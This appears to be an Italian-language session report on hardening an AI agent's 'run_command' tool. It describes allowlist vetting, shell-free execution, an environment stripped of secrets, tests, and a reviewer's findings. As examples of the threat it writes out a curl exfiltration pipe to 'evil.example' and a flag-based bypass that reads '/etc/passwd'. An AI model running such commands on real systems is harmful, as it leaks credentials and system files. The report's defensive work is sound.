# Report sessione 2026-06-12 (sera) — Sandbox di `run_command` (roadmap ALTA, punto 1)

`run_command` non esegue più una shell. Ogni comando passa per un vetting
fail-closed e gira senza shell, da una allowlist di soli comandi di lettura,
con l'ambiente ripulito dai segreti. Chiude i vettori naïve della falla 🟠
(esfiltrazione via shell), che scende da 🟠 a 🟡 (la chiusura piena resta il
sandbox OS). Suite finale: **44 PASS, 0 FAIL** (i 34 storici tutti verdi,
stabile su 3 run).

## Cosa fa, in parole semplici

Prima `run_command` poteva eseguire qualunque comando shell: bastava un
`cat secrets | curl evil.example -d @-` per far uscire una chiave. Ora ogni
comando viene prima ispezionato e poi eseguito **senza shell**: i trucchi da
terminale (pipe, redirezioni, concatenazioni, `$(...)`) non funzionano più, e
solo una lista fissa di comandi di sola lettura è ammessa. Le API key vengono
tolte dall'ambiente in cui gira il comando.

## Come funziona davvero (fedele al diff)

- **`_vet_command(command, cwd)`** in `gas.py`: ritorna `(argv, None)` se
  consentito, `(None, motivo)` se negato. Tre barriere:
  (1) `shlex.split` — i metacaratteri shell diventano testo o fanno fallire il
  parse; (2) `argv[0]` deve stare in `SHELL_ALLOWLIST` (frozenset di comandi
  di sola lettura; interpreti e wrapper esclusi di proposito); (3) ogni altro
  token è risolto con `_safe_path` (lo stesso di T10) e deve restare in root.
  Ogni messaggio di rifiuto finisce con "(fail-closed)".
- **`_sanitized_subprocess_env()`**: copia di `os.environ` senza le variabili
  il cui nome (maiuscolo) contiene KEY/TOKEN/SECRET/PASSWORD/PASSWD/
  CREDENTIAL/AUTH. PATH/HOME/LANG restano.
- **Esecuzione**: `subprocess.run(argv, shell=False, cwd=cwd, ...,
  timeout=60, env=self._sanitized_subprocess_env())`. Niente più
  `shell=True`, niente più stringa grezza.
- **Modalità (`GAS_SHELL_MODE`)**: `guarded` (default; valore non riconosciuto
  → fallback qui con warning) e `dry_run` (fa il vetting, **non** esegue e
  **non** fotografa: ritorna `[DRY-RUN] ... NON eseguito`). Letta in `__init__`
  in `self.shell_mode`.
- **Ordine**: vetting → (dry-run?) → snapshot → esecuzione. Un comando negato
  al vetting non spreca uno snapshot (mitiga in parte R2).
- **Contorno**: aggiornata la descrizione del tool nello schema (non più
  "Esegue comandi shell") e il system prompt base (regole del sandbox +
  alternative native: `grep -c`, `wc -l`, `write_file` al posto di `>`).
- **Limite dichiarato (onestà)**: è una recinzione applicativa contro
  l'esfiltrazione naïve, NON un confinamento OS. Gli interpreti restano fuori
  dall'allowlist per non riaprire l'esecuzione di codice arbitrario. La
  chiusura piena è il sandbox OS (prossimo passo). Finding 🟠 → 🟡.

## Test (tests/test_unit_kernel.py, zero token)

Nuovo blocco **T12** (10 check, ognuno fallisce se la barriera corrispondente
viene tolta): comando in allowlist eseguito davvero (output reale); comando
fuori allowlist negato; pipe / redirezione / command substitution rese innocue
(diventano argomenti letterali, nessun secondo processo); argomento-path con
`../` negato dentro `run_command`; comando non interpretabile negato; env
figlio privo di segreti; `dry_run` che non esegue e non crea snapshot;
fallback su `guarded` per `GAS_SHELL_MODE` non valido. **T11c2 rinforzato**:
ora usa un comando *in* allowlist (`ls`) così esercita davvero il fail-closed
dello snapshot invece di morire prima al vetting (era un falso verde).
Prova end-to-end fuori suite: 4 vettori di esfiltrazione neutralizzati, chiave
assente dall'env del figlio, comandi leciti ancora operativi.
**Totale: 44 PASS, 0 FAIL** (stabile su 3 run consecutivi).

## Review #4 (revisore)

**Verdetto: APPROVATO CON RISERVE** (commit `44a2128`). Validati: meccanismo a
tre barriere (`shlex.split` + allowlist + ricontrollo path), scelta allowlist
vs denylist, esclusione deliberata degli interpreti, env sanificata, ordine
vetting→(dry-run)→snapshot→esecuzione, modalità `guarded`/`dry_run` con
fallback fail-safe, test che "mordono". Riserve:

- **R1 — CHIUSA**: type hint di ritorno mancante su `_vet_command`. Aggiunto
  `-> Tuple[Optional[List[str]], Optional[str]]` (con `Tuple` nell'import);
  suite riverificata **44/44**, avvio del kernel confermato.
- **R2 — TRACCIATA** (finding 🟡): i valori attaccati ai flag
  (`grep -f/etc/passwd`, `--file=/etc/passwd`) superano il vetting per-token
  perché iniziano con `-`, mentre il binario interpreta il path esterno. Con
  l'allowlist attuale NON c'è esfiltrazione attiva (verificato), ma è una
  divergenza vetting/binario: RIVERIFICARE prima di allargare
  `SHELL_ALLOWLIST`. Difesa candidata: rifiutare token che iniziano con `-` e
  contengono `/` o `=`.
- **R3 — TRACCIATA** (finding 🟡): falsi positivi del path-check su argomenti
  non-path (un pattern grep tipo `/etc/cron` viene risolto come path assoluto
  e il comando negato). Fail-closed (lato sicuro), limite di usabilità noto.

Il revisore ha aggiunto 4 lezioni datate 2026-06-12 alla sua memoria
persistente (bypass via flag, test che mordono, ordine delle barriere,
canonicalizzazione vetting/exec) — ora 13 lezioni totali, 5 review completate.

## Istituzioni

- A) `reports/stato_progetto.md` aggiornato (sandbox chiuso, 🟠→🟡, test 44,
  prossimi passi rinumerati con il sandbox OS in cima).
- B) `reports/diff_sessione.md` rigenerato per questa sessione.
- C) Revisore: review #4 conclusa (APPROVATO CON RISERVE), 4 lezioni nuove
  datate in memoria (13 totali, 5 review).

## Prossimi passi

1. Sandbox a livello OS per `run_command` (bwrap/unshare) — chiusura piena del
   finding ridotto; check di disponibilità in `gas doctor`.
2. `WINDOW_CHAR_CAP` (review #1).
3. Manutenzione snapshot in `gas doctor` (R2/R3).
